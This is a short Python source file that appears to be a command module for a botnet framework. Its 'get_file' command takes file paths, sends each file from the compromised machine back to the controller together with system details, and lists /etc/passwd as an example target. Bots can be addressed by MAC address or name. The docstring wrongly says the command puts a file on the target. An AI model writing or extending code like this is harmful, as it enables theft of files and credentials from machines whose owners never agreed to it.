from .. import BotNet, Context, UserException


@BotNet.default_script(script_version="0.0.1")
def get_file(context: Context) -> None:
    """
    put file to target system

    syntax:
        `/get_file [route1] [route2]
        or
        `[mac-address] /get_file [route1] [route2]`
        or
        `[BOT-NAME] /get_file [route1] [route2]`

    example:
        `/get_file /etc/passwd`
        `/get_file ./file.exe`
    """
    if len(context.command) > 0:
        route = context.command[0]
        for i, route in enumerate(context.command):
            context.engine.send_file(route, {f"file route {i+1}": route, **context.system_info(minimal=True)})
    else:
        raise UserException("no route given")
